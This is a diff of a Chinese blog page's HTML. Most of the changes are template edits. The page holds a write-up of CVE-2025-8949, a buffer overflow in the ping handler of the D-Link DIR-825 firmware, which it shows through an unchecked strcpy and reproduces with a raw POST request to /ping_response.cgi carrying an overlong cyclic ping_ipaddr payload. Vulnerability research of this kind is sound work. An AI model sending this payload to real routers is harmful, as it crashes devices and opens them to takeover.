@@ -4,25 +4,37 @@
   <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
   <meta name="author" content="Misaki" />
-  <!-- Open Graph Description 简短摘要-->
   
-  <!-- 用于搜索引擎的文章摘要 -->
-  
-  <!-- 文章页 -->
   <meta name="description" content="记录 D-Link DIR-825 固件 CVE-2025-8949 的 FirmAE 仿真、httpd 中 get_ping_app_stat 函数分析、parse_special_char 过滤和 ping 参数溢出复现。" />
   
+  <link rel="canonical" href="https://misaki.wiki/ecd37e91.html">
+  <meta property="og:site_name" content="Misaki" />
+  <meta property="og:type" content="article" />
+  <meta property="og:title" content="CVE-2025-8949 D-Link DIR-825 ping 参数溢出漏洞分析 | Misaki" />
+  
+  <meta property="og:description" content="记录 D-Link DIR-825 固件 CVE-2025-8949 的 FirmAE 仿真、httpd 中 get_ping_app_stat 函数分析、parse_special_char 过滤和 ping 参数溢出复现。" />
+  
+  <meta property="og:url" content="https://misaki.wiki/ecd37e91.html" />
+  
+  <meta property="og:image" content="https://misaki.wiki/img/misaki.jpg" />
+  
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="CVE-2025-8949 D-Link DIR-825 ping 参数溢出漏洞分析 | Misaki" />
+  
+  <meta name="twitter:description" content="记录 D-Link DIR-825 固件 CVE-2025-8949 的 FirmAE 仿真、httpd 中 get_ping_app_stat 函数分析、parse_special_char 过滤和 ping 参数溢出复现。" />
+  
+  
+  <meta name="twitter:image" content="https://misaki.wiki/img/misaki.jpg" />
   
   
   <title>
-    
-      CVE-2025-8949 D-Link DIR-825 ping 参数溢出漏洞分析 
-      
-      
-      |
-    
-     Misaki
+    CVE-2025-8949 D-Link DIR-825 ping 参数溢出漏洞分析 | Misaki
   </title>
+  
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"CVE-2025-8949 D-Link DIR-825 ping 参数溢出漏洞分析","description":"记录 D-Link DIR-825 固件 CVE-2025-8949 的 FirmAE 仿真、httpd 中 get_ping_app_stat 函数分析、parse_special_char 过滤和 ping 参数溢出复现。","url":"https://misaki.wiki/ecd37e91.html","mainEntityOfPage":{"@type":"WebPage","@id":"https://misaki.wiki/ecd37e91.html"},"datePublished":"2025-10-30T12:28:00.000Z","dateModified":"2026-06-16T07:55:51.777Z","author":{"@type":"Person","name":"Misaki"},"publisher":{"@type":"Organization","name":"Misaki"},"image":["https://misaki.wiki/img/misaki.jpg"],"articleSection":"CVE","keywords":"pwn, CVE, IoT, firmware, FirmAE, D-Link, buffer-overflow"}</script>
+  
 
   
     <link rel="apple-touch-icon" href="/img/favicon.ico">
@@ -96,6 +108,14 @@
           <a href="/archives/">文章</a>
         </li>
       
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">分类</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
         <li class="nav-item" data-path="/friends/">
           <a href="/friends/">友链</a>
         </li>
@@ -116,21 +136,6 @@
       <div class="flex-container">
         <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
 <!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
-
-
-  <!-- LaTex Display -->
-
-  
-    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
-  
-  <script>
-    MathJax = {
-      tex: {
-        inlineMath: [['$', '$'], ['\\(', '\\)']]
-      }
-    }
-  </script>
-
 
 
 
@@ -159,13 +164,71 @@
   <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
   <div class="container post-details" id="post-details">
     <div class="post-content">
-      <div class="post-title">CVE-2025-8949 D-Link DIR-825 ping 参数溢出漏洞分析</div>
+      <h1 class="post-title">CVE-2025-8949 D-Link DIR-825 ping 参数溢出漏洞分析</h1>
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
-          2026-06-13 19:12:42
+          2026-06-16 15:55:51
         </span>
         
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/CVE/" title="CVE">
+                    <b>#</b> CVE
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/pwn/" title="pwn">
+                    #pwn
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/CVE/" title="CVE">
+                    #CVE
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/IoT/" title="IoT">
+                    #IoT
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/firmware/" title="firmware">
+                    #firmware
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/FirmAE/" title="FirmAE">
+                    #FirmAE
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/D-Link/" title="D-Link">
+                    #D-Link
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/buffer-overflow/" title="buffer-overflow">
+                    #buffer-overflow
+                  </a>
+                </span>
+                
+              </span>
+          
       </div>
       <div class="markdown-body">
         <p>[[CVE]]<br>Ubuntu18<br>IDA9.1<br>binwalk<br>[[FirmAE]]<br><a target="_blank" rel="noopener" href="https://ftp.dlink.ru/pub/Router/DIR-825/Firmware/RevB/DIR825B1_FW210WWB01.bin">固件下载</a><br>[[firmwalker]]</p>
@@ -181,6 +244,7 @@
 <p><img src="https://raw.githubusercontent.com/xxianxiayubanmian/text1/main/notes/imgs/20251101214823507.png" alt="image.png"><br>BYTE ping__1 400; &#x2F;&#x2F; sp+18h -258h BYREF<br>BYTE ping 200; &#x2F;&#x2F; sp+1A8h -C8h BYREF<br>最后strcpy(ping, ping__1);<br>由于ping__1比ping大的多，没有长度检查，会导致缓冲区溢出<br>parse_special_char虽然进行了字符串过滤，但是strcpy函数引发了缓冲区溢出<br><img src="https://raw.githubusercontent.com/xxianxiayubanmian/text1/main/notes/imgs/20251101215249873.png" alt="image.png"></p>
 <p><img src="https://raw.githubusercontent.com/xxianxiayubanmian/text1/main/notes/imgs/20251101215302705.png" alt="image.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST /ping_response.cgi HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.0.1</span><br><span class="line"></span><br><span class="line">Content-Length: 106</span><br><span class="line"></span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">Origin: http://192.168.0.1</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"></span><br><span class="line">Referer: http://192.168.0.1/tools_vct.asp</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">html_response_page=tools_vct.asp&amp;html_response_return_page=tools_vct.asp&amp;ping_ipaddr=aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaat&amp;ping=Ping</span><br></pre></td></tr></table></figure>
+
       </div>
       
         <div class="prev-or-next">
@@ -195,9 +259,67 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
-              2026-06-13 19:12:42
+              2026-06-16 15:55:51
             </span>
             
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/CVE/" title="CVE">
+                        <b>#</b> CVE
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/pwn/" title="pwn">
+                        #pwn
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/CVE/" title="CVE">
+                        #CVE
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/IoT/" title="IoT">
+                        #IoT
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/firmware/" title="firmware">
+                        #firmware
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/FirmAE/" title="FirmAE">
+                        #FirmAE
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/D-Link/" title="D-Link">
+                        #D-Link
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/buffer-overflow/" title="buffer-overflow">
+                        #buffer-overflow
+                      </a>
+                    </span>
+                    
+                  </span>
+              
           </div>
           <div class="post-foot-prev">
             
